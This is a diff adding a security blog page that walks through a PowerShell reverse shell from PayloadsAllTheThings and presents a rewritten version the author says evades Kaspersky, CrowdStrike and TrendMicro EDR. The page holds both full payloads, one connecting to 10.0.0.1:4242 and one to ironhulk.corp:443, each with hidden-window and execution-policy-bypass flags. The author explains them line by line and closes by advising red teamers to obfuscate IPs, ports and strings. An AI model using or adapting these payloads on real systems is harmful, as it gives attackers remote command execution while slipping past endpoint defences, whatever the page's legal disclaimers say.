@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Beyond Detection</title>
+
+  <!-- Responsive patch (minimal + specific) -->
+  <style>
+    /* Prevent any accidental overflow */
+    html, body { max-width: 100%; overflow-x: hidden; }
+
+    /* Make images/svgs shrink nicely */
+    img, svg { max-width: 100%; height: auto; }
+
+    /* Ensure long tables can scroll on mobile */
+    #resultTable { display: block; width: 100%; overflow-x: auto; }
+
+    /* Desktop: keep existing absolute link */
+    #backLink { position: absolute; top: 50%; right: 2rem; transform: translateY(-50%); }
+
+    /* Minor helpers for cards that need to stack on mobile */
+    .step-card { min-width: 0 !important; }
+    #cmpWrap > div { min-width: 0 !important; }
+
+    /* fd cards helper */
+    .fd-card { margin: 0 .5rem; }
+
+    /* Mobile tweaks */
+    @media (max-width: 768px) {
+      /* Header spacing + readable titles */
+      header { padding: 1.25rem !important; }
+      #title { font-size: clamp(1.6rem, 6vw, 2rem) !important; }
+      #subtitle { font-size: 1rem !important; }
+
+      /* Put "Back to Blogs" above title to avoid overlap */
+      #backLink {
+        position: static !important;
+        transform: none !important;
+        text-align: left;
+        margin-bottom: .5rem;
+      }
+
+      /* Meta row stacks neatly */
+      #metaRow {
+        flex-direction: column !important;
+        align-items: center !important;
+        gap: .35rem !important;
+        text-align: center;
+      }
+
+      /* File descriptors row becomes a column */
+      #fdRow { flex-direction: column !important; gap: 12px !important; }
+      .fd-card { margin: 0 !important; }
+
+      /* Numbered steps: one per row */
+      .step-card { flex: 1 1 100% !important; }
+
+      /* Comparison cards: one per row */
+      #cmpWrap > div { flex: 1 1 100% !important; }
+
+      /* Reduce large paddings a bit inside main card */
+      .main-article { padding: 1.25rem !important; }
+      .h-scroll {
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch; /* iOS momentum */
+    touch-action: pan-x;               /* ensures horizontal panning */
+    margin: 1rem 0;
+    border-radius: 8px;                /* moved from table */
+  }
+  /* Make the table wider than the viewport so scrolling is possible */
+  .h-scroll > #resultTable {
+    min-width: 720px;                  /* adjust if you need more/less */
+  }
+  /* Prevent cell content from wrapping on narrow screens */
+  @media (max-width: 768px) {
+    .h-scroll th,
+    .h-scroll td { white-space: nowrap; }
+  }
+    }
+  </style>
+</head>
+<body style="box-sizing:border-box; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height:1.6; color:#333; background-color:#f5f7f9;">
+  <div id="top" aria-hidden="true"></div>
+  <header style="position:relative; background:linear-gradient(135deg,#2c3e50 0%,#4a6491 100%); color:#fff; padding:2rem; border-bottom:5px solid #ff5722;">
+    <div id="backLink">
+      <a href="../projects.html" style="color:#ffb347; font-size:14px; text-decoration:none; font-weight:500;">
+        ← Back to Projects
+      </a>
+    </div>
+    <div style="text-align:center;">
+      <h1 id="title" style="font-size:2.8rem; margin:0 0 1rem;">
+        Beyond Detection 
+      </h1>
+      <p id="subtitle" style="font-size:1.5rem; font-weight:600; max-width:800px; margin:0 auto;">
+        Bypassing Modern AV/EDR with "Rewritten Payloads", shifting from "Flagged to Functional Malware"
+      </p>
+      <div id="metaRow" style="display:flex; justify-content:center; gap:20px; margin-top:1.5rem; font-size:.9rem; color:rgba(255,255,255,.8);">
+        <span>Written by: Iron Hulk</span>
+        <span>Published: October 11, 2025</span>
+        <span id="reading-time" style="color:rgba(255,255,255,.8);"></span>
+        <span>
+          <a href="https://twitter.com/IronHulk_0xff" target="_blank" rel="noopener noreferrer"
+            style="color:#ffffff; text-decoration:none; display:inline-flex; align-items:center; gap:5px;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="#60a5fa" aria-hidden="true">
+              <path d="M22.46 6c-.77.35-1.6.58-2.46.69a4.27 4.27 0 001.88-2.35 8.48 8.48 0 01-2.7 1.04 4.23 4.23 0 00-7.24 3.86A12 12 0 013 4.79a4.23 4.23 0 001.31 5.64 4.18 4.18 0 01-1.91-.53v.05a4.23 4.23 0 003.39 4.14 4.3 4.3 0 01-1.9.07 4.24 4.24 0 003.95 2.93A8.5 8.5 0 012 19.54a12 12 0 006.29 1.84c7.55 0 11.68-6.26 11.68-11.68 0-.18 0-.36-.01-.54A8.35 8.35 0 0022.46 6z"/>
+            </svg>
+            <span>IronHulk</span>
+          </a>
+        </span>
+      </div>
+    </div>
+  </header>
+  <main id="content" role="main">
+    <div style="margin:0 auto; padding:20px;">
+      <div class="main-article" style="background:#fff; padding:2rem; border-radius:8px; box-shadow:0 4px 10px rgba(0,0,0,.1);">
+        <p style="margin:0 0 1.2rem;">
+          In my last post, I talked about <a href="../GeneralInfo/EDR.html" style="color:#ff5722; text-decoration:none; font-weight:500;"> <strong>what EDR is</strong></a>, why it matters,
+          and what to consider when choosing the right product. I also wrote another blog where I explained how syntax can help <a href="../Projects/ReverseShellSyntax.html" style="color:#ff5722; text-decoration:none; font-weight:500;"> <strong>Bypasses Detection</strong></a>.
+          In this blog, I want to share my experience about how I fixed a PowerShell “Reverse Shell” script that was marked as malware by every antivirus and EDR tool. I looked at an 
+          existing version of the code from PayloadsAllTheThings, studied how it worked, and rewrote some key parts of it. I'll walk through the changes I made to the code, the 
+          decisions I made along the way, and the security lessons I learned from the whole process.
+        </p>
+        <div style="background:#ffebee; padding:1.2rem; border-left:4px solid #f44336; border-radius:4px; margin:1.5rem 0; font-size:.9rem;">
+          <strong>Disclaimer:</strong> The security solutions mentioned here are working as intended and are still providing solid protection. This analysis isn't meant to point out 
+          any flaws in products or companies. Rather, it looks at special situations and detailed ways these solutions are used, which can sometimes lead to missed information. The 
+          goal of this writing is to help everyone better understand how to defend against threats and improve how we detect and respond to them.
+        </div>
+        <p class="mt-3 text-sm text-yellow-300 italic">
+        </p>
+        <h2 style="color:#2c3e50; margin:2rem 0 1rem; padding-bottom:.5rem; border-bottom:2px solid #eee;">🔧 What is Code Remediation:</h2>
+        <p style="margin:0 0 1.2rem;">
+          <strong>Code remediation</strong> is the process of finding, fixing, and improving code that has problems, or doesn't work well. The word "remediation" comes 
+          from "remedy," which means to solve an issue. In cybersecurity and software development, code remediation means making purposeful changes to the code to fix its problems and 
+          get it to work properly again. In our example, we use this idea to look at and fix a broken "flagged" PowerShell script. We focus on rewriting the script and making its 
+          logic work as intended to bypass security checks. The goal is to understand why the script was flagged and to show how fixing or rewriting it can make a real difference.
+        </p>
+        <h2 style="color:#2c3e50; margin:2rem 0 1rem; padding-bottom:.5rem; border-bottom:2px solid #eee; display:flex; align-items:center; gap:.5rem;">
+          <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+            <path d="M9 3h6M10 3v4.5l-5.6 8.9A3 3 0 0 0 7.1 21h9.8a3 3 0 0 0 2.7-4.6L14 7.5V3" stroke="#2c3e50" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+            <path d="M7.5 16h9" stroke="#2c3e50" stroke-width="1.8" stroke-linecap="round"/>
+          </svg>
+          The Experiment
+        </h2>
+        <div style="margin:1.2rem 0; padding:1rem 1.2rem; background:#fff8f6; border-left:4px solid #f44336; border-radius:6px;">
+          <p style="margin:0 0 .6rem; display:flex; align-items:center; gap:.4rem;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true" style="flex:0 0 18px;">
+              <path d="M5 21V4m0 0c3-1.2 5 1.2 8 0s5 1.2 6 0v11c-3 1.2-5-1.2-8 0s-5-1.2-6 0V4Z" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            <strong>Let’s walk through the Flagged Payload:</strong>
+          </p>
+          <pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</pre>
+          <br><strong>Short summary:</strong> The one-line PowerShell snippet opens a TCP connection from the host that runs it to a remote IP and port, reads text sent from the remote side, executes 
+          that text as PowerShell commands, and returns the command output back over the same TCP connection. This pattern is commonly called a reverse shell because the target host 
+          initiates a connection back to a controller and then accepts remote commands.
+          <ul style="margin:.6rem 0 0 1.2rem;">
+            <li><pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">powershell -NoP -NonI -W Hidden -Exec Bypass -Command</pre>
+              These are PowerShell process flags that change how PowerShell runs, non-interactive mode, hide the window, and alter execution policy. In general, such flags control execution behavior and visibility.</li><br>
+            <li><pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242)</pre>
+              Creates a TCP client object and attempts to open a network connection to the specified remote IP and port. In a reverse-shell scenario the local machine initiates a connection to the remote controller.</li><br>
+            <li><pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">$stream = $client.GetStream();</pre>
+              Obtains a network stream associated with the TCP connection to send and receive bytes.</li><br>
+            <li><pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">[byte[]]$bytes = 0..65535|%{0};</pre>
+              Allocates a large byte buffer used to receive incoming data from the network stream.</li><br>
+            <li><pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ ... }</pre>
+              Reads from the network stream into the buffer in a loop. The loop continues while there is incoming data.</li><br>
+            <li><pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);</pre>
+              Converts the raw received bytes into a text string using ASCII (text encoding). That string is the incoming data (commonly commands in a reverse-shell scenario).</li><br>
+            <li><pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">$sendback = (iex $data 2>&1 | Out-String );</pre>
+              Runs the received text through PowerShell’s iex (invoke-expression), capturing any output or errors as a string. (This is the part that executes received instructions.)</li><br>
+            <li><pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">$sendback2 = $sendback + "PS " + (pwd).Path + "> ";};</pre>
+              Prepares a response by appending a prompt or context (current working directory) to the captured output.</li><br>
+            <li><pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()</pre>
+              Encodes the response back into bytes and writes them to the network stream so the remote side receives the command output.</li><br>
+            <li><pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">client.Close()</pre>
+              Closes the loop and, ultimately, the TCP connection when the stream ends.</li>
+          </ul>
+
+          <p style="margin:.8rem 0 0;">
+            <strong>How this fits the reverse shell concept:</strong> A reverse shell reverses the usual client/server roles, the target host (where the code runs) proactively 
+            connects out to a remote listener. Once the connection is established, the remote side can send commands, and the target executes them and returns the results back to the server.
+            <br><br>
+            <strong>Why is it flagged?</strong> EDR/AV flag that PowerShell snippet because it matches many high-confidence indicators of malicious remote control or misuse: hidden, 
+            non-interactive PowerShell with execution-policy bypass; a direct TCP client creating an outbound interactive channel; execution of received text (iex/invoke-expression); 
+            single-line, obfuscated/compact payload structure; and unusual network behavior for powershell.exe. Taken together these signals form high-risk telemetry that EDRs are 
+            trained to alert on.
+          </p>
+        </div>
+        <div style="margin:1.2rem 0; padding:1rem 1.2rem; background:#f9f9f9; border-left:4px solid #4caf50; border-radius:6px;">
+          <p style="margin:0 0 .6rem; display:flex; align-items:center; gap:.4rem;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true" style="flex:0 0 18px;">
+              <path d="M12 3l7 3v6c0 4.5-3.2 7.9-7 9-3.8-1.1-7-4.5-7-9V6l7-3Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
+              <path d="M9 12l2 2 4-4" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            <strong>Now, let's go through the Unflagged Payload:</strong>
+          </p>                    
+          <div style="background:#fff0f0; padding:1.2rem; border-left:4px solid #d32f2f; border-radius:6px; margin:1.5rem 0; font-size:.95rem; color:#2b2b2b; line-height:1.45;">
+            <strong style="display:block; margin-bottom:.35rem; font-size:1rem; display:flex; align-items:center; gap:.4rem;">
+              <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M12 3l7 3v6c0 4.6-3.4 8.2-7 9-3.6-.8-7-4.4-7-9V6l7-3z" fill="#ef5350"/>
+                <path d="M12 7v7" stroke="#ffffff" stroke-width="2" stroke-linecap="round"/>
+                <circle cx="12" cy="17.5" r="1.3" fill="#ffffff"/>
+              </svg>
+              Disclaimer: Must Read Carefully
+            </strong>
+                        This repository includes proof-of-concept code and demonstrations intended strictly for authorized security research, controlled red-team engagements, and defensive testing in environments where you have explicit, written permission.
+            <br><br>
+            <strong>Do NOT copy, modify, deploy, or execute</strong> this material against any system, network, or device unless you hold clear, documented authorization from the system owner. Unauthorized use is illegal and may result in criminal prosecution, civil liability, and severe professional consequences.
+            The authors expressly disclaim any warranty and accept <strong>no liability for damage, data loss, legal claims, or criminal charges arising from misuse.</strong>
+            Use this content only for lawful, ethical, and constructive purposes. Failure to comply is unacceptable.
+          </div>
+          
+          <pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">
+            # LEGAL: Authorized security testing ONLY.
+            # Coded by: Iron Hulk
+            # Date: October 11, 2025
+            # STRICT PROHIBITIONS:
+            # ▸ ANY UNAUTHORIZED ACCESS TO SYSTEMS IS ILLEGAL
+            # ▸ USE AGAINST SYSTEMS YOU DON'T OWN IS FEDERALLY PROHIBITED
+            # ▸ DISTRIBUTION TO MALICIOUS ACTORS IS UNLAWFUL
+            # ▸ BYPASSING SECURITY CONTROLS WITHOUT AUTHORIZATION CONSTITUTES CRIMINAL ACTIVITY
+            # ▸ IRON HULK BEARS ZERO RESPONSIBILITY FOR MISUSE
+
+
+            powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
+            `$serverIP = 'ironhulk.corp'; `
+            `$port = 443; `
+            try { `
+                `$client = [System.Net.Sockets.TcpClient]::new(`$serverIP, `$port); `
+                `$stream = `$client.GetStream(); `
+                `$reader = [System.IO.StreamReader]::new(`$stream, [System.Text.Encoding]::ASCII); `
+                `$writer = [System.IO.StreamWriter]::new(`$stream, [System.Text.Encoding]::ASCII); `
+                `$writer.AutoFlush = `$true; `
+                while (`$true) { `
+                    `$command = `$reader.ReadLine(); `
+                    if (`$command -eq 'exit') { break }; `
+                    `$output = (Invoke-Expression `$command 2>&1 | Out-String).Trim(); `
+                    `$writer.WriteLine(`$output); `
+                } `
+            } catch { `
+                'Error occurred: ' + `$_.Exception.Message `
+            } finally { `
+                if (`$client.Connected) { `$client.Close() } `
+            }"
+          </pre>
+          <br><strong>Short summary:</strong> The above PowerShell snippet does the same as the one-liner code, it opens a TCP connection from the host that runs it to a remote IP and 
+          port, reads text sent from the remote side, executes that text as PowerShell commands, and returns the command output back over the same TCP connection. This pattern is 
+          commonly called a reverse shell because the target host initiates a connection back to a controller and then accepts remote commands. Here's the line-by-line breakdown: 
+          <ul style="margin:.6rem 0 0 1.2rem;">
+            <li><pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">powershell -NoP -NonI -W Hidden -Exec Bypass -Command</pre>
+              Starts PowerShell with a set of runtime flags. Each flag changes how PowerShell runs, skip loading a user profile, run non-interactively, hide the window, and relax script execution policy checks. In plain terms: it tells PowerShell to run quietly and without the usual interactive environment.</li><br>
+            <li><pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">`$serverIP = 'ironhulk.corp';</pre>
+              Defines a variable holding the destination IP/Domain address, that’s the network address the script will try to reach.</li><br>
+            <li><pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">`$port = 443;</pre>
+              Defines a variable holding the destination port number.</li><br>
+            <li><pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">try {</pre>
+              Begins a guarded block to run operations that might fail; if an error occurs inside this block, control passes to the error handler. It’s a standard programming pattern for safe cleanup and error reporting.</li><br>
+            <li><pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">`$client = [System.Net.Sockets.TcpClient]::new(`$serverIP, `$port);</pre>
+              Attempts to establish a TCP (network) connection to the defined address and port.</li><br>
+            <li><pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">`$stream = `$client.GetStream();</pre>
+              Gets the bidirectional data stream associated with the network connection so the program can send and receive bytes/text over that socket.</li><br>
+            <li><pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">`$reader = [System.IO.StreamReader]::new(`$stream, [System.Text.Encoding]::ASCII); `</pre>
+              Wraps the incoming stream in a text reader so the program can read incoming data as lines of text rather than raw bytes “treat the network input as text messages.”</li><br>
+            <li><pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">`$writer = [System.IO.StreamWriter]::new(`$stream, [System.Text.Encoding]::ASCII); `</pre>
+              wraps the same $stream and encodes text into bytes using ASCII before writing them out to the network. So when the code does something like WriteLine("hello"), the writer converts that text into ASCII bytes and sends them on the wire.</li><br>
+            <li><pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">`$writer.AutoFlush = `$true;</pre>
+              Ensures that anything the program writes is immediately sent out rather than being buffered on the local side. In other words, don’t hold onto output, push it straight to the wire.</li><br>
+            <li><pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">while (`$true) {</pre>
+              Enters an infinite loop that continuously waits for input and reacts to it. This makes the program keep running and processing messages until told to stop.</li><br>
+            <li><pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">`$command = `$reader.ReadLine();</pre>
+              Reads one line of text from the remote.</li><br>
+            <li><pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">if (`$command -eq 'exit') { break };</pre>
+              If the received line equals the special token 'exit', break out of the loop. I just added it for control. However, it's a simple stop condition to terminate the ongoing session.</li><br>
+            <li><pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">`$output = (Invoke-Expression `$command 2>&1 | Out-String).Trim();</pre>
+            Executes the received text as a PowerShell expression/command and captures its output (including errors), then converts it to a single string and trims whitespace. Just like saying “run what the other server sent, capture both normal output and errors, and convert it into a text block suitable for returning.”</li><br>
+            <li><pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">`$writer.WriteLine(`$output);}</pre>
+              Sends the captured output back to the remote as one line (or a chunk of text).</li><br>
+            <li><pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">catch {'Error occurred: ' +$_.Exception.Message `}</pre>
+              Begins the error-handling block that executes if any exception is thrown in the try block, and logs a brief error message describing what went wrong.</li><br>
+            <li><pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">finally {if ($client.Connected) { $client.Close() }</pre>
+              Begins the cleanup block that runs whether or not an error occurred. finally is used to ensure resources are released.</li>
+          </ul>
+        </div>
+        <p style="margin:0 0 1.2rem;">
+          Both examples implement the same pattern at a conceptual level, a local process opens a TCP connection to a remote endpoint and then uses that connection as a command/response 
+          channel, receiving textual input, treating it as commands to be executed locally, capturing the output, and sending the output back over the socket. The security concerns are 
+          the same for both, remote command execution, use of built-in platform tooling, and potential for misuse. Now,the conceptual differences and important design/behavioral considerations.
+        </p>
+        <h2 style="margin:2rem 0 1rem; color:#2c3e50;">Demo</h2>
+
+        <div style="
+          display:grid;
+          grid-template-columns:repeat(auto-fit, minmax(220px, 1fr));
+          gap:16px;
+          margin-bottom:2rem;
+        ">
+          <div style="background:#f9fafb; border:1px solid #e5e7eb; border-radius:8px; padding:1rem; text-align:center; transition:.3s;">
+            <h3 style="color:#111827; margin:.4rem 0;">kaspersky Optimum EDR </h3><br>
+            <a href="../Projects/src/Kas.mp4" target="_blank" style="background:#60a5fa; color:#fff; padding:.5rem 1rem; border-radius:6px; text-decoration:none;">View Demo</a>
+          </div>
+          <div style="background:#f9fafb; border:1px solid #e5e7eb; border-radius:8px; padding:1rem; text-align:center; transition:.3s;">
+            <h3 style="color:#111827; margin:.4rem 0;">CrowedStrick</h3><br>
+            <a href="../Projects/src/crowed.mp4" target="_blank" style="background:#60a5fa; color:#fff; padding:.5rem 1rem; border-radius:6px; text-decoration:none;">View Demo</a>
+          </div>
+          <div style="background:#f9fafb; border:1px solid #e5e7eb; border-radius:8px; padding:1rem; text-align:center; transition:.3s;">
+            <h3 style="color:#111827; margin:.4rem 0;">TrendMicro Max Security</h3><br>
+            <a href="../Projects/src/trind.mp4" target="_blank" style="background:#60a5fa; color:#fff; padding:.5rem 1rem; border-radius:6px; text-decoration:none;">View Demo</a>
+          </div>
+        </div>
+        <h2 style="margin:2rem 0 1rem; color:#2c3e50;">Summary of the Test</h2>
+        <div style="
+          display:grid;
+          grid-template-columns:repeat(auto-fit, minmax(220px, 1fr));
+          gap:16px;
+          margin-bottom:2rem;
+        ">
+          <table style="
+            width:100%;
+            border-collapse:collapse;
+            font-family:system-ui, sans-serif;
+            font-size:14px;
+            background:#fff;
+            box-shadow:0 1px 4px rgba(0,0,0,0.08);
+            border-radius:8px;
+            overflow:hidden;
+          ">
+            <thead style="background:#1e293b;color:#f8fafc;">
+              <tr>
+                <th style="padding:10px;text-align:left;">Aspect</th>
+                <th style="padding:10px;text-align:left;">IronShellCode (Structured StreamReader/Writer)</th>
+                <th style="padding:10px;text-align:left;">One-Liner (Compact Byte-Loop One-Liner)</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td style="padding:10px;border-top:1px solid #e2e8f0;">Connection Setup</td>
+                <td style="padding:10px;border-top:1px solid #e2e8f0;">Uses <code>TcpClient</code> directly with IP/Domain.</td>
+                <td style="padding:10px;border-top:1px solid #e2e8f0;">Creates <code>TCPClient</code> directly with IP/Domain.</td>
+              </tr>
+              <tr>
+                <td style="padding:10px;border-top:1px solid #e2e8f0;">Data Framing / Input Mode</td>
+                <td style="padding:10px;border-top:1px solid #e2e8f0;">Line-oriented via <code>StreamReader.ReadLine()</code>; waits for newline-terminated commands.</td>
+                <td style="padding:10px;border-top:1px solid #e2e8f0;">Byte-oriented; reads raw buffers with <code>Read()</code> and must handle message boundaries manually.</td>
+              </tr>
+              <tr>
+                <td style="padding:10px;border-top:1px solid #e2e8f0;">Encoding</td>
+                <td style="padding:10px;border-top:1px solid #e2e8f0;">Converts bytes ⇄ text with <code>System.Text.ASCIIEncoding</code>.</td>
+                <td style="padding:10px;border-top:1px solid #e2e8f0;">Converts bytes ⇄ text with <code>System.Text.ASCIIEncoding</code>.</td>
+              </tr>
+              <tr>
+                <td style="padding:10px;border-top:1px solid #e2e8f0;">Execution Loop</td>
+                <td style="padding:10px;border-top:1px solid #e2e8f0;">Reads each line, executes it, trims output, sends back result.</td>
+                <td style="padding:10px;border-top:1px solid #e2e8f0;">Processes received bytes, executes decoded text, appends a prompt (<code>PS path&gt;</code>).</td>
+              </tr>
+              <tr>
+                <td style="padding:10px;border-top:1px solid #e2e8f0;">Termination</td>
+                <td style="padding:10px;border-top:1px solid #e2e8f0;">Breaks on sentinel token <code>exit</code>.</td>
+                <td style="padding:10px;border-top:1px solid #e2e8f0;">Ends when the stream closes (read returns 0).</td>
+              </tr>
+              <tr>
+                <td style="padding:10px;border-top:1px solid #e2e8f0;">Error Handling</td>
+                <td style="padding:10px;border-top:1px solid #e2e8f0;">Has <code>try/catch/finally</code> for cleanup and graceful failure.</td>
+                <td style="padding:10px;border-top:1px solid #e2e8f0;">No structured exception handling; abrupt on errors.</td>
+              </tr>
+              <tr>
+                <td style="padding:10px;border-top:1px solid #e2e8f0;">Output Behavior</td>
+                <td style="padding:10px;border-top:1px solid #e2e8f0;">Sends trimmed output only; quiet response channel.</td>
+                <td style="padding:10px;border-top:1px solid #e2e8f0;">Sends output plus interactive prompt string; more human-friendly.</td>
+              </tr>
+              <tr>
+                <td style="padding:10px;border-top:1px solid #e2e8f0;">Cleanup</td>
+                <td style="padding:10px;border-top:1px solid #e2e8f0;">Closes socket in <code>finally</code>; ensures resource release.</td>
+                <td style="padding:10px;border-top:1px solid #e2e8f0;">Closes client only after loop; no guaranteed cleanup on error.</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        <div style="background:#e8f5e9; padding:0.2rem; border-left:4px solid #4caf50; ">
+          <h2 style="color:#2c3e50; border-bottom:1px solid #eee;">Conclusion</h2>
+          <p style="color:#1e293b;  ">
+            This experiment underscores that every security control, no matter how advanced, requires continuous tuning and validation. Adversaries evolve quickly, probing for overlooked 
+            behaviors, weak configurations, or blind spots in detection pipelines. The goal is<strong> not to criticize security products</strong>, but to reveal how small can make big changes. 
+            <br><br>
+            <strong>For defenders</strong>: the takeaway is clear, monitor deeply, log comprehensively, test often, and treat detection as a living process. Building resilient systems means anticipating 
+            the next move, tightening every signal path, and maintaining a mindset of constant verification. True defense is not static—it’s an ongoing cycle of learning, adapting, and 
+            improving.
+            <br><br>
+            <strong>For red teamrs</strong>: find a way to obfuscate the code (IP, Port, and strings). And yeah, don't put it one-liner or your code is flagged. 
+          </p>
+        </div>
+      </div>
+    </div>
+    <footer style="position:relative;  background:#2c3e50; color:#fff; border-radius:8px;">
+      <div style="max-width:1000px; margin:0 auto; padding:20px; text-align:center;">
+        <p style="margin:0 0 .6rem;">Crafted with Passion</p>
+        <p style="margin:0;">2025 © Iron Hulk — All Rights Reserved.</p>
+        <a href="../projects.html" style="color:#94a3b8; font-size:13px; padding:6px 12px; border-radius:6px; text-decoration:none;">
+          ← Back to Projects
+        </a>
+      </div>
+      <a href="#top" style="position:absolute; right:20px; top:50%; transform:translateY(-50%); color:#94a3b8; text-decoration:none;">
+        <svg xmlns="http://www.w3.org/2000/svg" style="width:24px; height:24px;" viewBox="0 0 20 20" fill="currentColor">
+          <path fill-rule="evenodd" d="M3.707 10.707a1 1 0 01-1.414-1.414l7-7a1 1 0 011.414 0l7 7a1 1 0 11-1.414 1.414L11 4.414V19a1 1 0 11-2 0V4.414L3.707 10.707z" clip-rule="evenodd" />
+        </svg>
+      </a>
+    </footer>
+    <script>
+      function applyResponsive() {
+        const fdRow = document.getElementById('fdRow');
+        if (!fdRow) return;
+        if (window.innerWidth <= 768) {
+          fdRow.style.flexDirection = 'column';
+        } else {
+          fdRow.style.flexDirection = 'row';
+        }
+      }
+      applyResponsive();
+      window.addEventListener('resize', applyResponsive);
+    </script>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const content = document.getElementById("content");
+        const readingTimeEl = document.getElementById("reading-time");
+        if (content && readingTimeEl) {
+          const text = content.innerText || content.textContent;
+          const words = text.trim().split(/\s+/).length;
+          const minutes = Math.max(1, Math.ceil(words / 200));
+          readingTimeEl.textContent = `Reading time: ${minutes} min`;
+        }
+      });
+    </script>
+  </main>
+</body>
+</html>
